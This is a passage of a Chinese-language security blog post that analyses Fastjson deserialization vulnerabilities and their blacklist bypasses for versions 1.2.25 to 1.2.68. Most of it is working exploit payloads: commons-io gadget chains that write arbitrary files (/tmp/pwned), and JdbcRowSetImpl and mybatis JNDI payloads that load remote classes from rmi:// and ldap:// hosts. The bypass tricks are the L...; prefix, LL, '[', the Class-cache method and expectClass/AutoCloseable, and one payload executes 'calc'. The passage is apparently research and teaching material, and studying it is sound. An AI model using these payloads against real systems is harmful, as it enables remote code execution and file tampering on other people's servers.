class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">        <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,</span><br><span class="line">            <span class="string">&quot;reader&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;charSequence&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;</span></span><br><span class="line">                               &#125;,</span><br><span class="line">                <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                <span class="string">&quot;bufferSize&quot;</span>:<span class="number">1024</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span>,</span><br><span class="line">                <span class="string">&quot;writer&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;file&quot;</span>:<span class="string">&quot;/tmp/pwned&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;encoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;append&quot;</span>: <span class="literal">false</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                <span class="string">&quot;bufferSize&quot;</span>: <span class="number">1024</span>,</span><br><span class="line">                <span class="string">&quot;writeImmediately&quot;</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;trigger&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;is&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">                <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">                <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;trigger2&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;is&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">                <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">                <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;trigger3&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;is&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">                <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">                <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="commons-io-2-7-2-8-0-版本：">commons-io 2.7 - 2.8.0 版本：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">        <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,</span><br><span class="line">            <span class="string">&quot;reader&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;charSequence&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;start&quot;</span>:<span class="number">0</span>,</span><br><span class="line">                                <span class="string">&quot;end&quot;</span>:<span class="number">2147483647</span></span><br><span class="line">                               &#125;,</span><br><span class="line">                <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                <span class="string">&quot;bufferSize&quot;</span>:<span class="number">1024</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span>,</span><br><span class="line">                <span class="string">&quot;writer&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;file&quot;</span>:<span class="string">&quot;/tmp/pwned&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;append&quot;</span>: <span class="literal">false</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                <span class="string">&quot;bufferSize&quot;</span>: <span class="number">1024</span>,</span><br><span class="line">                <span class="string">&quot;writeImmediately&quot;</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;trigger&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;inputStream&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">                <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">                <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;trigger2&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;inputStream&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">                <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">                <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;trigger3&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;inputStream&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">                <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">                <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg">https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg</a></p><p><a href="https://xz.aliyun.com/t/12492?">https://xz.aliyun.com/t/12492?</a></p><p><a href="https://www.cnblogs.com/zpchcbd/p/14969606.html?ref=www.ctfiot.com">https://www.cnblogs.com/zpchcbd/p/14969606.html?ref=www.ctfiot.com</a></p><p><a href="https://github.com/lemono0/FastJsonParty/blob/main/FastJson1268%E5%86%99%E6%96%87%E4%BB%B6RCE%E6%8E%A2%E7%A9%B6.md">https://github.com/lemono0/FastJsonParty/blob/main/FastJson1268%E5%86%99%E6%96%87%E4%BB%B6RCE%E6%8E%A2%E7%A9%B6.md</a></p><h3 id="C3p0-hex链">C3p0 hex链</h3><p><a href="https://www.yuque.com/zqiangweihuakai/ybltae/gn8pc9n3hhcvwiit">C3P0链</a></p><p>参考：<a href="https://forum.butian.net/share/2868">https://forum.butian.net/share/2868</a></p><p><a href="https://goodapple.top/archives/1749">https://goodapple.top/archives/1749</a></p><p><a href="https://xz.aliyun.com/t/12286?">https://xz.aliyun.com/t/12286?</a></p><h2 id="1-2-25-1-2-41Bypass">1.2.25-1.2.41Bypass</h2><p>先来看看是怎么修复的</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733561460107-2f50952c-9409-477f-8dfd-8dd05d6c7385.png" alt=""></p><p>加了一个autoTypeSupport 这个默认值为false，如果为True的话在与下面的acceptList白名单进行匹配如果通过就调用loadclass之后在与denyList黑名单进行匹配，如果匹配就直接跑出异常</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733561634177-5dd6dc69-5df3-480f-b7b2-3e21cbcae994.png" alt=""></p><p>这是这三个值的定义</p><p>白名单默认为空，从配置文件里加载 黑名单自己跟进去看看吧有点长截不全，就是一些常见的恶意链的利用的类。</p><p>这里我们先看看如果不在黑名单他的下面执行流程是怎么样的</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733562526874-4806db42-5c9b-47e2-a4b0-18a3894da718.png" alt=""></p><p>这里会先从这个mapping的缓存里去找，如果这里没有的话会去下面的反序列化器里去找，这里都不是重点</p><p>继续向下看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733562895904-eaedee7c-c8e6-4210-9fea-c95fecc0367c.png" alt=""></p><p>如果这个autotype为false的话会在走一遍黑名单和白名单的过滤如果为true会进入到TypeUtils的loadclass方法里</p><p>跟进去看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733563617389-89789da2-65fc-4ef4-adad-f0b9b03f2b98.png" alt=""></p><p>主要看红框中的代码</p><ul><li>如果以<code>[</code>开头则去掉<code>[</code>后进行类加载（在之前Fastjson已经判断过是否为数组了，实际走不到这一步）</li><li>如果以<code>L</code>开头，以<code>;</code>结尾，则去掉开头和结尾进行类加载</li></ul><p>那么加上<code>L</code>开头和<code>;</code>结尾实际上就可以绕过所有黑名单</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">String json= <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://10.37.129.2:1099/l1pwqj\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">JSON.parseObject(json);</span><br></pre></td></tr></table></figure><p>这里有限制就是需要这里关闭白名单限制才可以执行。</p><h2 id="1-2-42版本绕过">1.2.42版本绕过</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733566031771-a14069f2-ecec-4166-b2ee-58f600154a06.png" alt=""></p><p>这里使用了hashcode进行截取将L和;之间的类名截取出来</p><p>所以这里只需要双写就可以绕过，但是同样的也需要手动设置为true</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">       String json= <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://10.37.129.2:1099/l1pwqj\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">       JSON.parseObject(json);</span><br></pre></td></tr></table></figure><h2 id="1-2-43bypass">1.2.43bypass</h2><p>在此版本中,<code>checkAutoType</code>对<code>LL</code>进行了判断，如果类以<code>LL</code>开头，则直接抛出异常</p><p>在<code>TypeUtils.loadClass</code>中，还对<code>[</code>进行了处理，因此又可以通过<code>[</code>来进行绕过，具体可以根据报错抛出的异常来进行构造payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1399/Exploit&quot;</span>, </span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-45bypass">1.2.45bypass</h2><p>1.2.45版本添加了一些黑名单，但是存在组件漏洞，我们能通过mybatis组件进行JNDI接口调用，进而加载恶意类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;properties&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://127.0.0.1：9999/EXP&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-47bypass">1.2.47bypass</h2><p>此版本可以不需要开启autotype，具体逻辑看白日梦组长的视频</p><p>还是在checkautotype里面</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733566638382-a8147587-5864-446c-bb58-01e6b2762533.png" alt=""></p><p>可以看到这里会加载缓存里有没有存在的已经加载过的，如果有就直接返回clazz</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733566850911-f0fd54f5-5e54-4ef6-b4d5-d261dcbf48cc.png" alt=""></p><p>而在<code>ParserConfig</code>类初始化时会执行<code>initDeserializers</code>方法，会向<code>deserializers</code>中添加许多的类，类似一种缓存，其中会添加这么一个类<code>this.deserializers.put(Class.class, MiscCodec.instance);</code></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733566997705-20ea37d5-56ea-4f90-b0c7-f25dbcfaed06.png" alt=""></p><p>他在执行反序列化的时候会调用loadclass方法</p><p>也就是我们传的字符串会传入到这个loadclass里面<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733567138719-e1b41779-b5ae-4ac5-a97e-e1958a205acc.png" alt=""></p><p>然后他会把它放到mapping里面，然后在后面进行chekautotype的时候我们前面说过如果有会直接返回所以这里就绕过了检查</p><p>现在来看看在那里给strVal赋值</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733567598223-4618c7a0-0fcb-4422-a8c5-c042afd38cd3.png" alt=""></p><p>再去找objval</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733567713353-97c20d6c-c5fd-47bc-90b0-a8b2460879b3.png" alt=""></p><p>可以看到如果不是val就会报错，所以前半段的payload应该是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="comment">//满足clazz为Class.class</span></span><br><span class="line"><span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="comment">//有val，且值为我们要写入mapping的恶意类</span></span><br><span class="line"><span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733568245229-5c0f9c1d-96f2-426a-9d18-6e417d353aa4.png" alt=""></p><p>上文我们已经分析过了，通过从<code>mapping</code>中加载恶意类可以绕过<code>checkAutoType()</code>的检测，当我们第二次进入checkAutoType()的时候，就会从mapping中获取恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;1\&quot;:&#123;\&quot;@type\&quot;: \&quot;java.lang.Class\&quot;, \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\&quot;2\&quot;: &#123;\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;: \&quot;rmi://10.37.129.2:1099/l1pwqj\&quot;, \&quot;autoCommit\&quot;: true&#125;&#125;&quot;</span>;</span><br><span class="line">JSON.parseObject(json);</span><br></pre></td></tr></table></figure><h2 id="1-2-68Bypass">1.2.68Bypass</h2><p>本次绕过checkAutoType()函数的关键点在于其第二个参数expectClass，可以通过构造恶意JSON数据、传入某个类作为expectClass参数再传入另一个expectClass类的子类或实现类来实现绕过checkAutoType()函数执行恶意操作。</p><p>简单地说，本次绕过checkAutoType()函数的攻击步骤为：</p><ol><li>先传入某个类，其加载成功后将作为expectClass参数传入checkAutoType()函数；</li><li>查找expectClass类的子类或实现类，如果存在这样一个子类或实现类其构造方法或setter方法中存在危险操作则可以被攻击利用；</li><li>条件</li></ol><ul><li>Fastjson &lt;= 1.2.68；</li><li>利用类必须是expectClass类的子类或实现类，并且不在黑名单中；</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vul;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulAutoCloseable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulAutoCloseable</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;vul.VulAutoCloseable&quot;</span>,<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;calc&quot;</span>&#125;</span><br><span 